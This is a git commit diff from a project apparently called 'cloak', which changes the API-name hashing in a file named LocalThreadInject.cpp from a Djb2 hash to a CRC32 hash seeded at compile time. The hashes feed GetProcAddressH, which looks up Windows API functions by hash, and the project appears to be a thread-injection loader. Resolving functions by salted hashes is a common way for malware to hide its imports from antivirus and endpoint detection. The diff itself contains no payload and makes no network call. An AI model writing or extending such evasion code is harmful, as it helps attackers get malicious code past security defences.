91f86e689a67596ea8ac7deba43ff5a7ba6b85ba
drngd0tter <drngd0tter@localhost>
2025-03-26 19:33:57 -0400

    update hashing algo

--- cloak/include/Config.hpp
+++ cloak/include/Config.hpp
@@ -3,9 +3,10 @@
 #ifndef CONFIG_H
 #define CONFIG_H
 
-// #define DEBUG
+#define DEBUG
 
 #define HASH_API
+#define RAND 0xA4
 
 #define LOCAL_THREAD
 
--- cloak/src/LocalThreadInject.cpp
+++ cloak/src/LocalThreadInject.cpp
@@ -4,8 +4,6 @@
 
 #ifdef HASH_API
 
-#define SEED 6
-
 constexpr int RandomCompileTimeSeed(void)
 {
 	return '0' * -23784 +
@@ -17,20 +15,31 @@ constexpr int RandomCompileTimeSeed(void)
 		__TIME__[0] * 2;
 };
 
-constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;
+constexpr auto g_KEY = RandomCompileTimeSeed() % RAND;
 
-constexpr DWORD HashStringDjb2A(const char* String) {
-	ULONG Hash = (ULONG)g_KEY;
-	INT c = 0;
-	while ((c = *String++)) {
-		Hash = ((Hash << SEED) + Hash) + c;
+constexpr DWORD HashStringCrc32(const char* String) {
+	UINT32      uMask	= 0x00,
+				uHash	= g_KEY;
+	INT         i		= 0x00;
+
+	while (String[i] != 0) {
+
+		uHash = uHash ^ (UINT32)String[i];
+
+		for (int ii = 0; ii < 8; ii++) {
+
+			uMask = -1 * (uHash & 1);
+			uHash = (uHash >> 1) ^ (0xEDB88320 & uMask);
+		}
+
+		i++;
 	}
 
-	return Hash;
+	return ~uHash;
 }
 
-#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
-#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
+#define RTIME_HASHA( API ) HashStringCrc32((const char*) API)
+#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringCrc32((const char*) #API);
 
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
 
